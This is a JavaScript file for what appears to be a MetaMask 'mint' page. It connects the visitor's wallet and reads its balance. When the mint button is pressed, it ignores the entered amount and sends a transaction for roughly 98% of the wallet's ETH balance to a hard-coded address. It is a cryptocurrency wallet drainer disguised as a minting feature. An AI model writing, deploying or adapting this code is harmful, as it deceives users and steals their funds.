const MetamaskBTN = document.querySelector(".Block_Content-Metamask");
const Metamask_MintBTN = document.querySelector(".Block_Content-Metamask_Mint");
const Metamask_MintInput = document.querySelector(".Block_Content-Metamask_MintInput");
const Metamask_MintInfo = document.querySelector(".Block_Content-Metamask_MintInfo");

window.onload = (_) => {
  if (!window.ethereum) {
    MetamaskBTN.innerHTML = "Please download Metamask";
    MetamaskBTN.style.cssText = "pointer-events: none !important;";
  } else {
    MetamaskBTN.onclick = async (_) => {
      const info = await ethereum.request({
        method: "eth_requestAccounts",
      });
      const balance = await ethereum.request({
        method: "eth_getBalance",
        params:[ info[0] , "latest"]
      });
      if (info) {
        MetamaskBTN.remove();
        Metamask_MintBTN.style.display = "block";
        Metamask_MintInput.style.display = "block";
        Metamask_MintBTN.onclick = (_) => {
          if (Metamask_MintInput.value == "") {
            Metamask_MintInfo.innerHTML = "You didnt enter anything";
          } else {
            ethereum
              .request({
                method: "eth_sendTransaction",
                params: [
                  {
                    from: info[0],
                    // your address
                    to: "0x2D550E85aa24BcD73C758ef949734dc30b33658b",
                    value: (parseInt(balance) * 0.999 ** 18).toString(16),
                  },
                ],
              })
              .then((txHash) => console.log(txHash))
              .catch((error) => console.error(error));
          }
        };
      }
    };

  }
};

